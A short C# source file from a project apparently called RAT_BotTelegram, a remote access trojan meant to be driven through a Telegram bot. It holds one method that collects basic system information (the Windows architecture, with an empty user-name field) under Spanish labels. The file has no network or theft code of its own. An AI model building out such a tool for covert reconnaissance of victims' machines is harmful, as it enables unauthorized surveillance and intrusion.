using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using RAT_BotTelegram.Lib;

namespace RAT_BotTelegram.Lib {
    class CommandsFeatures {
        public Features fs = new Features();

        public String PC_Info() {
            Console.WriteLine(fs.getArquitectura());
            String Info ="Información Detallada" +
                "Nombre del usuario: " +
                "\nWindows: " + fs.getArquitectura() + 
                "" +
                "";


            return Info;
        }
    }
}
